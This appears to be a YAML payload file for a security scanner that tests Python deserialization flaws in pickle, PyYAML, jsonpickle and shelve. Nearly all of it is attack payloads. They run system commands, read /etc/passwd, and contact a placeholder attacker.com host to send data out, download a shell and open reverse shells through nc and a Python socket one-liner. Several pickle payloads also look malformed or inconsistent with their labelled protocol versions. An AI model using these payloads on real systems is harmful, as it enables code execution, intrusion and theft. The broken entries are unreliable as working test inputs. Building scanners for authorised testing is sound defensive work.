---
name: "Python Deserialization Attack"
category: "deserialization"
severity: "critical"
description: "Tests for Python deserialization vulnerabilities including pickle, PyYAML, jsonpickle, and shelve. Targets unsafe loading of serialized objects."

target_fields:
  - "data"
  - "object"
  - "pickle"
  - "serialized"
  - "json"
  - "yaml"
  - "yml"
  - "body"
  - "content"
  - "payload"
  - "input"
  - "request"
  - "message"
  - "event"
  - "state"
  - "session"
  - "cache"
  - "config"
  - "settings"
  - "preferences"
  - "metadata"
  - "blob"
  - "binary"
  - "stream"
  - "file"
  - "upload"
  - "import"
  - "export"
  - "backup"
  - "restore"

payloads:
  # Pickle protocol 0 (ASCII)
  - "(S'whoami'\nos\nsystem\n."
  - "(S'calc.exe'\nos\nsystem\n."
  - "(S'cat /etc/passwd'\nos\nsystem\n."
  - "(S'curl http://attacker.com/exfil'\nos\nsystem\n."
  - "(S'wget http://attacker.com/shell -O /tmp/shell'\nos\nsystem\n."
  - "(S'nc -e /bin/sh attacker.com 4444'\nos\nsystem\n."
  - "(S'python -c \"import socket,subprocess,os;s=socket.socket();s.connect((\\\"attacker.com\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/sh\\\"])\"'\nos\nsystem\n."
  
  # Pickle protocol 1 (binary)
  - "80024e710028580700000077686f616d6971710168037102532e2e"
  - "80024e710028580700000063616c632e657865710168037102532e2e"
  - "80024e7100285811000000636174202f6574632f706173737764710168037102532e2e"
  
  # Pickle protocol 2 (binary with memo)
  - "80024e710028580700000077686f616d69710168037102532e2e"
  - "80024e710028580700000063616c632e657865710168037102532e2e"
  
  # Pickle protocol 3 (Python 3.x)
  - "80034e710028580700000077686f616d69710168037102532e2e"
  - "80034e710028580700000063616c632e657865710168037102532e2e"
  
  # Pickle protocol 4 (Python 3.8+)
  - "80044e710028580700000077686f616d69710168037102532e2e"
  - "80044e710028580700000063616c632e657865710168037102532e2e"
  
  # Pickle protocol 5 (Python 3.8+)
  - "80054e710028580700000077686f616d69710168037102532e2e"
  - "80054e710028580700000063616c632e657865710168037102532e2e"
  
  # Base64 encoded pickle payloads
  - "gASVBQAAAAAAAACMB3dob2FtaZSMCnN1YnByb2Nlc3OUjARjYWxsUpQu"
  - "gASVBQAAAAAAAACMB2NhbGMuZXhllIwKc3VicHJvY2Vzc5SMBGNhbGyULg=="
  - "gASVFAAAAAAAAACMCWNhdCAvZXRjL3Bhc3N3ZJSMCnN1YnByb2Nlc3OUjARjYWxsUpQu"
  
  # PyYAML unsafe loading
  - "!!python/object/apply:os.system ['whoami']"
  - "!!python/object/apply:os.system ['calc.exe']"
  - "!!python/object/apply:os.system ['cat /etc/passwd']"
  - "!!python/object/apply:subprocess.call [['whoami']]"
  - "!!python/object/apply:subprocess.Popen [['whoami']]"
  - "!!python/object/apply:subprocess.run [['whoami']]"
  - "!!python/object/new:subprocess.Popen [['whoami']]"
  - "!!python/object/new:os.system ['whoami']"
  - "!!python/object/apply:builtins.exec ['import os; os.system(\"whoami\")']"
  - "!!python/object/apply:builtins.eval ['__import__(\"os\").system(\"whoami\")']"
  - "!!python/object/apply:builtins.compile ['import os; os.system(\"whoami\")', '<string>', 'exec']"
  - "!!python/object/apply:builtins.__import__ ['os']"
  - "!!python/object/apply:__import__('os').system ['whoami']"
  
  # PyYAML with tags
  - "!!python/object:__main__.Exploit {}"
  - "!!python/object/apply:__main__.Exploit.run []"
  - "!!python/module:os"
  - "!!python/name:os.system"
  - "!!python/object/apply:os ['system', ['whoami']]"
  
  # jsonpickle payloads
  - '{"py/object": "__main__.Exploit", "command": "whoami"}'
  - '{"py/object": "os.system", "py/args": ["whoami"]}'
  - '{"py/object": "subprocess.call", "py/args": [["whoami"]]}'
  - '{"py/function": "os.system", "py/args": ["whoami"]}'
  - '{"py/object": "__builtin__.eval", "py/args": ["__import__(\"os\").system(\"whoami\")"]}'
  - '{"py/object": "builtins.exec", "py/args": ["import os; os.system(\"whoami\")"]}'
  - '{"py/object": "__main__.Shell", "py/state": {"cmd": "whoami"}}'
  - '{"py/repr": "os.system(\\"whoami\\")"}'
  - '{"py/reduce": [{"py/type": "os.system"}, {"py/tuple": ["whoami"]}]}'
  
  # shelve/cPickle payloads
  - "csystem\np0\n(S'whoami'\np1\ntp2\nRp3\n."
  - "cos\nsystem\np0\n(S'calc.exe'\np1\ntp2\nRp3\n."
